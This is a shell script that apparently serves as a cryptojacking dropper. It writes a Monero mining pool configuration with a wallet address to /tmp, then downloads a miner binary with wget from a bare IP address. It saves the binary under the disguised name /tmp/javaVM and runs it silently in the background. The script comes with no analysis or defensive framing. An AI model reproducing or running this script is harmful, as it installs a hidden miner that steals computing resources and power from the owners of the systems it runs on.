#!/bin/sh

cat /dev/null > config.json
cat >config.json <<EOL
{
    "autosave": true,
    "cpu": true,
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "algo": null,
            "coin": "XMR",
			"1gb-pages":true,
			"rx":[0,1,2,3,4],
            "url": "pool.supportxmr.com:3333",
            "user": "NHbNLSXXkj2Xchnx4qTMXwRusLJMcTCchDaq.Work002",
            "pass": "x",
            "tls": true,
            "keepalive": true,
            "nicehash": true
        }
    ]
}
EOL
mv config.json /tmp/config.json

if [ -f /tmp/javaVM ]
 	then
 	/tmp/javaVM > /dev/null 2>&1 &
 	echo Started Existing
 	else
 		wget -q http://150.136.168.71:80/archxx/xmrig1 -O /tmp/javaVM
 		chmod +x /tmp/javaVM
 		/tmp/javaVM > /dev/null 2>&1 &
fi
